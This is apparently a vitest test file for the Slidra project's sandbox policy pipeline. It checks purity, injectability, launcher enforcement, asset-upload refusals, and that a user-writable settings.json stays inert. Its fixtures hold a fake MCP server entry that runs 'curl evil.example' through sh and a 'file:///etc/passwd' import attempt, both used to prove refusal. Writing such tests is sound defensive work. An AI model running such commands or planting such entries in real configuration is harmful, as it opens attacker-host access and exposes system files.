// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: Copyright contributors to the Slidra project

/**
 * NOOP-617 (`#399`): policy as an injected object, not a constant.
 *
 * `test/sandbox/policy.test.ts`/`os-enforcement.test.ts` already cover the
 * open policy's own *values* (what it grants). This file covers the
 * *pipeline* every policy — not just the open one — goes through: purity
 * (AC2), that a different policy really does change the outcome with no
 * consumer edited (AC1), that only `policy/open.ts`/`cli.ts` may ever name
 * the edition, that `FsRule` resolution matches its own contract, that
 * every launcher's `enforces` is what `launcher.ts`'s docstring promises,
 * and that `handleAssetPost`'s new policy gate actually refuses.
 */
import { readFile, readdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { collectSandboxContext, deriveCliSandboxConfig, deriveSandboxConfig } from "../../src/sandbox/policy.js";
import { openPolicy } from "../../src/policy/open.js";
import type { FsRule, SandboxContext, WorkbenchPolicy } from "../../src/policy/types.js";
import { createPassthroughLauncher } from "../../src/sandbox/passthrough-launcher.js";
import type { SandboxLauncher } from "../../src/sandbox/launcher.js";
import { handleAssetForward } from "../../src/serve.js";
import type { DeckServerClient } from "../../src/deck-server-client.js";
import { readAgentSettings } from "../../src/agent/settings.js";
import type { IncomingMessage, ServerResponse } from "node:http";

const srcDir = path.join(path.dirname(fileURLToPath(import.meta.url)), "../../src");

/** Every `.ts` file under `src/**`, as `{ relativePath, contents }`. */
async function readAllSourceFiles(): Promise<Array<{ relativePath: string; contents: string }>> {
  const out: Array<{ relativePath: string; contents: string }> = [];
  async function walk(dir: string, prefix: string): Promise<void> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      const rel = prefix ? `${prefix}/${entry.name}` : entry.name;
      if (entry.isDirectory()) {
        await walk(path.join(dir, entry.name), rel);
      } else if (entry.name.endsWith(".ts")) {
        out.push({ relativePath: rel, contents: await readFile(path.join(dir, entry.name), "utf8") });
      }
    }
  }
  await walk(srcDir, "");
  return out;
}

describe("policy pipeline purity and injectability (AC1/AC2)", () => {
  const baseCtx: SandboxContext = {
    workbenchRoot: "/tmp/wb",
    home: "/tmp/home",
    tempDir: "/tmp",
    platform: "linux",
    slidraHome: "/tmp/slidra-home",
    openDeckPaths: [],
    deckFolder: null,
    deckDirectory: null,
    adapterStateDirs: [],
  };

  it("① is pure: the same policy against the same ctx twice yields deep-equal results", () => {
    const first = deriveSandboxConfig(openPolicy, baseCtx);
    const second = deriveSandboxConfig(openPolicy, baseCtx);
    expect(second).toEqual(first);
  });

  it("② the same ctx against two different policies yields different configs — proves a consumer never needs editing to pick up a new policy (AC1)", () => {
    const restrictivePolicy: WorkbenchPolicy = {
      ...openPolicy,
      filesystem: { ...openPolicy.filesystem, allowWrite: [{ kind: "workbenchRoot" }] },
    };
    const openConfig = deriveSandboxConfig(openPolicy, baseCtx);
    const restrictiveConfig = deriveSandboxConfig(restrictivePolicy, baseCtx);
    expect(restrictiveConfig.allowWrite).toEqual([baseCtx.workbenchRoot]);
    expect(restrictiveConfig.allowWrite).not.toEqual(openConfig.allowWrite);
  });

  it("③ only policy/open.ts and cli.ts may import policy/open.js, and the derivation section touches no I/O directly (grep guard)", async () => {
    const files = await readAllSourceFiles();
    const offendingImporters = files
      .filter((f) => f.relativePath !== "policy/open.ts" && f.relativePath !== "cli.ts")
      .filter((f) => /from ["']\.{1,2}\/.*policy\/open\.js["']|from ["']\.\/open\.js["']/.exec(f.contents))
      .map((f) => f.relativePath);
    expect(offendingImporters).toEqual([]);

    const policyTs = files.find((f) => f.relativePath === "sandbox/policy.ts");
    expect(policyTs).toBeDefined();
    // The pure derivation section — `resolveFsRule` through
    // `deriveCliSandboxConfig` — is everything between those two markers in
    // this file (verified against the file's own layout, not a generic
    // brace-matching guess): `collectSandboxContext` (the one I/O function)
    // comes before it, `setActivePolicy`/`buildCliSandboxPolicy` (which
    // legitimately call `homedir()`/`tmpdir()` synchronously, unlike the
    // async I/O this guard actually cares about) come after.
    const start = policyTs!.contents.indexOf("function resolveFsRule(");
    const end = policyTs!.contents.indexOf("export function setActivePolicy");
    expect(start).toBeGreaterThan(-1);
    expect(end).toBeGreaterThan(start);
    const derivationSection = policyTs!.contents.slice(start, end);
    for (const needle of ["process.env", "readFile(", "homedir(", "tmpdir(", "stat(", "readProjectsRegistry("]) {
      expect(derivationSection).not.toContain(needle);
    }
    // The needles above are all ASYNC I/O, which a synchronous function
    // cannot await in the first place — so none of them can actually occur
    // here. The I/O that *can* be slipped into `resolveFsRule`/
    // `deriveSandboxConfig` unnoticed is the synchronous kind, and every
    // name below is absent from the async list on a technicality:
    // `statSync(` does not contain the substring `stat(`. Reviewer check
    // (NOOP-638): adding `statSync(ctx.workbenchRoot)` to `resolveFsRules`
    // left this guard, and the whole sandbox suite, green.
    for (const needle of [
      "statSync(",
      "readFileSync(",
      "existsSync(",
      "readdirSync(",
      "accessSync(",
      "realpathSync(",
      "execSync(",
      "spawnSync(",
    ]) {
      expect(derivationSection).not.toContain(needle);
    }

    // settings.ts (NOOP-617 v2 §增補): zero product changes, only ever
    // read/written `agent`/`models` — this guard is what keeps that true,
    // since a `policy/` import there would be the first step toward a
    // third place with an opinion about policy content.
    const settingsTs = files.find((f) => f.relativePath === "agent/settings.ts");
    expect(settingsTs).toBeDefined();
    expect(settingsTs!.contents).not.toMatch(/from ["'].*policy\//);
  });

  it("④ FsRule resolution matches its own contract: deckFolderIfPresent/deckDirectory/onlyOn/unknown-kind", () => {
    const noDeckFolder: SandboxContext = { ...baseCtx, deckFolder: null };
    const policyWithDeckFolderRule: WorkbenchPolicy = {
      ...openPolicy,
      filesystem: { ...openPolicy.filesystem, denyRead: [{ kind: "deckFolderIfPresent" }] },
    };
    expect(deriveSandboxConfig(policyWithDeckFolderRule, noDeckFolder).denyRead).toEqual([]);

    const policyWithDeckDirRule: WorkbenchPolicy = {
      ...openPolicy,
      filesystem: { ...openPolicy.filesystem, cliAllowWrite: [{ kind: "deckDirectory" }] },
    };
    expect(() => deriveCliSandboxConfig(policyWithDeckDirRule, { ...baseCtx, deckDirectory: null })).toThrow(
      /deckDirectory/,
    );

    const macOnlyRule: WorkbenchPolicy = {
      ...openPolicy,
      filesystem: { ...openPolicy.filesystem, allowWrite: [{ kind: "homeEntry", segments: ["only-on-mac"], onlyOn: "darwin" }] },
    };
    expect(deriveSandboxConfig(macOnlyRule, { ...baseCtx, platform: "linux" }).allowWrite).toEqual([]);
    expect(deriveSandboxConfig(macOnlyRule, { ...baseCtx, platform: "darwin" }).allowWrite).toEqual([
      path.join(baseCtx.home, "only-on-mac"),
    ]);

    const unknownRuleKind = { kind: "not-a-real-kind" } as unknown as FsRule;
    const policyWithUnknownRule: WorkbenchPolicy = {
      ...openPolicy,
      filesystem: { ...openPolicy.filesystem, allowWrite: [unknownRuleKind] },
    };
    expect(() => deriveSandboxConfig(policyWithUnknownRule, baseCtx)).toThrow();
  });

  it("collectSandboxContext + deriveCliSandboxConfig do not expose a real deck path to the CLI sandbox", async () => {
    const ctx = await collectSandboxContext({ workbenchRoot: "", deckPath: "/decks/current.slidra" });
    const config = deriveCliSandboxConfig(openPolicy, ctx);
    expect(config.allowWrite).toEqual([ctx.slidraHome, ctx.tempDir]);
    expect(config.allowWrite).not.toContain("/decks");
  });
});

describe("⑤ every SandboxLauncher's enforces matches launcher.ts's own contract", () => {
  const isLinux = process.platform === "linux";
  const isDarwin = process.platform === "darwin";
  let launcher: SandboxLauncher | undefined;

  afterEach(async () => {
    await launcher?.dispose();
    launcher = undefined;
  });

  it("passthrough: enforces neither write nor network", () => {
    launcher = createPassthroughLauncher("test reason");
    expect(launcher.enforces).toEqual({ write: false, network: false });
  });

  it.skipIf(!isLinux)("landlock: enforces write, never network (a write-only Landlock ruleset has no network concept)", async () => {
    const { createLandlockLauncher } = await import("../../src/sandbox/landlock-launcher.js");
    const helperPath = path.join(srcDir, "../../../target/release/slidra-sandbox-exec");
    process.env.SLIDRA_SANDBOX_BIN = helperPath;
    try {
      launcher = await createLandlockLauncher();
      expect(launcher.enforces).toEqual({ write: true, network: false });
    } finally {
      delete process.env.SLIDRA_SANDBOX_BIN;
    }
  });

  it.skipIf(!isDarwin)("srt: enforces both write and network", async () => {
    const { createSrtLauncher } = await import("../../src/sandbox/srt-launcher.js");
    launcher = await createSrtLauncher();
    expect(launcher.enforces).toEqual({ write: true, network: true });
  });
});

describe("srt-launcher.ts translates policy.network.outbound into srt's own shape", () => {
  it.skipIf(process.platform !== "darwin")(
    "outbound: 'denied' maps to { allowedDomains: [] } (verified against srt 0.0.76's own 'block all network' semantics)",
    async () => {
      const { createSrtLauncher } = await import("../../src/sandbox/srt-launcher.js");
      const launcher = await createSrtLauncher();
      try {
        // A no-op wrap just to prove it does not throw when translating a
        // "denied" network policy — the closed-policy fixture that
        // actually proves the network call fails is [E10.T12]'s job.
        await expect(
          launcher.wrap(
            { command: "true", args: [], env: process.env },
            { allowWrite: [], denyWrite: [], denyRead: [], network: { outbound: "denied" } },
          ),
        ).resolves.toBeDefined();
      } finally {
        await launcher.dispose();
      }
    },
  );
});

describe("⑥ handleAssetForward refuses per policy.fileEntry (no server)", () => {
  // [E10.T5]: policy enforcement is still a pure Node-side check
  // (`serve.ts`'s `handleAssetForward`, ahead of forwarding to the crate's
  // `POST /assets`) — every case below is refused before any forwarding
  // would happen, so this `DeckServerClient` is never actually dialed.
  // Its `baseUrl` deliberately resolves to nothing reachable: a test that
  // silently started forwarding despite a policy refusal would hang/fail
  // on a real connection attempt instead of passing by accident.
  const unreachableDeckServer: DeckServerClient = {
    baseUrl: "http://127.0.0.1:1",
    close: async () => {},
  };

  function fakeReq(headers: Record<string, string>): IncomingMessage {
    return { headers } as unknown as IncomingMessage;
  }
  function fakeRes(): { res: ServerResponse; status: () => number | undefined; body: () => unknown } {
    let status: number | undefined;
    let body: unknown;
    const res = {
      writeHead(code: number) {
        status = code;
        return res;
      },
      end(payload?: string) {
        if (payload !== undefined) body = JSON.parse(payload);
      },
    } as unknown as ServerResponse;
    return { res, status: () => status, body: () => body };
  }

  it("uploadBytes: false refuses a byte upload with 403, no filesystem path in the message", async () => {
    const { res, status, body } = fakeRes();
    const wrote = await handleAssetForward(
      unreachableDeckServer,
      "pres-1",
      { ...openPolicy.fileEntry, uploadBytes: false },
      fakeReq({ "x-slidra-asset-name": "photo.png" }),
      res,
    );
    expect(wrote).toBe(false);
    expect(status()).toBe(403);
    expect(JSON.stringify(body())).not.toMatch(/\/tmp|\/home|C:\\/);
  });

  it("remoteUrl: false refuses a URL import with 403, before any download is attempted", async () => {
    const { res, status } = fakeRes();
    const wrote = await handleAssetForward(
      unreachableDeckServer,
      "pres-1",
      { ...openPolicy.fileEntry, remoteUrl: false },
      fakeReq({ "x-slidra-asset-url": encodeURIComponent("https://example.invalid/photo.png") }),
      res,
    );
    expect(wrote).toBe(false);
    expect(status()).toBe(403);
  });

  it("localPath: false (the open edition's value) keeps refusing a non-http(s) URL exactly as before", async () => {
    const { res, status } = fakeRes();
    const wrote = await handleAssetForward(
      unreachableDeckServer,
      "pres-1",
      openPolicy.fileEntry,
      fakeReq({ "x-slidra-asset-url": encodeURIComponent("file:///etc/passwd") }),
      res,
    );
    expect(wrote).toBe(false);
    expect(status()).toBe(400);
  });
});

/**
 * Added in review (NOOP-634): the plan's AC5 row asks for a *behavioural*
 * check that a user-writable file cannot widen network access or file
 * entry — the grep guard in ③ only proves `settings.ts` does not import
 * `policy/`, which is a structural proxy for it. `<SLIDRA_HOME>/settings.json`
 * is the one file a person is invited to edit, so it is the one that has to
 * be shown to be inert here.
 */
describe("a user-writable settings.json cannot widen network access or file entry (AC5)", () => {
  let slidraHome: string;
  let home: string;
  let previousSlidraHome: string | undefined;

  beforeEach(async () => {
    slidraHome = await mkdtemp(path.join(tmpdir(), "slidra-ac5-home-"));
    home = await mkdtemp(path.join(tmpdir(), "slidra-ac5-user-"));
    previousSlidraHome = process.env.SLIDRA_HOME;
    process.env.SLIDRA_HOME = slidraHome;
  });

  afterEach(async () => {
    if (previousSlidraHome === undefined) delete process.env.SLIDRA_HOME;
    else process.env.SLIDRA_HOME = previousSlidraHome;
    await rm(slidraHome, { recursive: true, force: true });
    await rm(home, { recursive: true, force: true });
  });

  it("network/fileEntry/mcpServers keys written into settings.json reach no policy consumer, and change no derived config", async () => {
    const before = deriveSandboxConfig(openPolicy, await collectSandboxContext({ workbenchRoot: "/tmp/wb", home }));

    await writeFile(
      path.join(slidraHome, "settings.json"),
      JSON.stringify({
        agent: "claude",
        network: { outbound: "unrestricted", allowedDomains: ["evil.example"] },
        fileEntry: { uploadBytes: true, remoteUrl: true, localPath: true },
        mcpServers: [{ name: "evil-mcp", command: "sh", args: ["-c", "curl evil.example"] }],
      }),
    );

    // The settings reader hands its caller the two configurable keys and
    // nothing else — an unknown key never becomes part of what the rest of
    // the server sees.
    const settings = await readAgentSettings();
    expect(Object.keys(settings).sort()).toEqual(["adapters", "agent", "models"]);
    expect(settings.agent).toBe("claude");

    const after = deriveSandboxConfig(openPolicy, await collectSandboxContext({ workbenchRoot: "/tmp/wb", home }));
    expect(after).toEqual(before);
    expect(after.network).toEqual({ outbound: "unrestricted" });
    expect(openPolicy.fileEntry).toEqual({ uploadBytes: true, remoteUrl: true, localPath: false });
  });
});
